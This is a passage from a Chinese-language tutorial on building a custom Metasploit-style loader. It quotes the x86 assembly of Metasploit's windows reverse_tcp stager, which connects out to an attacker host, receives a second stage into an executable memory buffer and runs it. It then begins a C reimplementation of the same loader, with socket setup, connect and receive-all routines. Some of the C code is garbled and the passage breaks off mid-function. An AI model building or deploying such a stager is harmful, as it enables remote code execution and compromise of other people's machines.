> 6.退出
### 0x03 loader构造
以上分析证明流程确实这样的，可能与原来程序会有出入。
我们来看看原来程序源码
文件lib\msf\core\payload\windows\reverse_tcp.rb
    .........省略无关代码
    reverse_tcp:
            push '32'               ; Push the bytes 'ws2_32',0,0 onto the stack.
            push 'ws2_'             ; ...
            push esp                ; Push a pointer to the "ws2_32" string on the stack.
            push #{Rex::Text.block_api_hash('kernel32.dll', 'LoadLibraryA')}
            call ebp                ; LoadLibraryA( "ws2_32" )
            mov eax, 0x0190         ; EAX = sizeof( struct WSAData )
            sub esp, eax            ; alloc some space for the WSAData structure
            push esp                ; push a pointer to this stuct
            push eax                ; push the wVersionRequested parameter
            push #{Rex::Text.block_api_hash('ws2_32.dll', 'WSAStartup')}
            call ebp                ; WSAStartup( 0x0190, &WSAData );
    set_address:
            push #{retry_count}     ; retry counter
    create_socket:
            push #{encoded_host}    ; host in little-endian format
            push #{encoded_port}    ; family AF_INET and port number
            mov esi, esp            ; save pointer to sockaddr struct
            push eax                ; if we succeed, eax will be zero, push zero for the flags param.
            push eax                ; push null for reserved parameter
            push eax                ; we do not specify a WSAPROTOCOL_INFO structure
            push eax                ; we do not specify a protocol
            inc eax                 ;
            push eax                ; push SOCK_STREAM
            inc eax                 ;
            push eax                ; push AF_INET
            push #{Rex::Text.block_api_hash('ws2_32.dll', 'WSASocketA')}
            call ebp                ; WSASocketA( AF_INET, SOCK_STREAM, 0, 0, 0, 0 );
            xchg edi, eax           ; save the socket for later, don't care about the value of eax after this
    try_connect:
            push 16                 ; length of the sockaddr struct
            push esi                ; pointer to the sockaddr struct
            push edi                ; the socket
            push #{Rex::Text.block_api_hash('ws2_32.dll', 'connect')}
            call ebp                ; connect( s, &sockaddr, 16 );
            test eax,eax            ; non-zero means a failure
            jz connected
    handle_connect_failure:
            ; decrement our attempt count and try again
            dec dword [esi+8]
            jnz try_connect
    .........省略无关代码
     recv:
            ; Receive the size of the incoming second stage...
            push 0                  ; flags
            push 4                  ; length = sizeof( DWORD );
            push esi                ; the 4 byte buffer on the stack to hold the second stage length
            push edi                ; the saved socket
            push #{Rex::Text.block_api_hash('ws2_32.dll', 'recv')}
            call ebp                ; recv( s, &dwLength, 4, 0 );
    .........省略无关代码
            ; Alloc a RWX buffer for the second stage
            mov esi, [esi]          ; dereference the pointer to the second stage length
            push 0x40               ; PAGE_EXECUTE_READWRITE
            push 0x1000             ; MEM_COMMIT
            push esi                ; push the newly recieved second stage length.
            push 0                  ; NULL as we dont care where the allocation is.
            push #{Rex::Text.block_api_hash('kernel32.dll', 'VirtualAlloc')}
            call ebp                ; VirtualAlloc( NULL, dwLength, MEM_COMMIT, PAGE_EXECUTE_READWRITE );
            ; Receive the second stage and execute it...
            xchg ebx, eax           ; ebx = our new memory address for the new stage
            push ebx                ; push the address of the new stage so we can return into it
    read_more:
            push 0                  ; flags
            push esi                ; length
            push ebx                ; the current address into our second stage's RWX buffer
            push edi                ; the saved socket
            push #{Rex::Text.block_api_hash('ws2_32.dll', 'recv')}
            call ebp                ; recv( s, buffer, length, 0 );
    .........省略无关代码
    read_successful:
            add ebx, eax            ; buffer += bytes_received
            sub esi, eax            ; length -= bytes_received, will set flags
            jnz read_more           ; continue if we have more to read
            ret                     ; return into the second stage
所以，用利用得到的信息，我们来构建loader
模拟loader载荷程序reverse_tcp
    /* 
    *初始化INIT socket
    */
    void winsock_init() {
        WSADATA wsaData;
        if (WSAStartup(MAKEWORD(2, 2), &wsaData) h_addr, target->h_length);
        sock.sin_family = AF_INET;
        sock.sin_port = htons(port);
        /* 尝试连接 */
        if ( connect(my_socket, (struct sockaddr *)&sock, sizeof(sock)) )
            punt(my_socket, "[-] Could not connect to target");
        return my_socket;
    }
因为，第一次不是获取DLL文件的，而是获取4字节缓冲区内存大小的，所以接收数据要分几次，一次是接收不完数据的，最好是创建一个专门的函数来接收。
    /* 尝试从套接字接收所有请求的数据。 */
    int recv_all(SOCKET my_socket, void * buffer, int len) {
        int    tret   = 0;
        int    nret   = 0;
        void * startb = buffer;
        while (tret 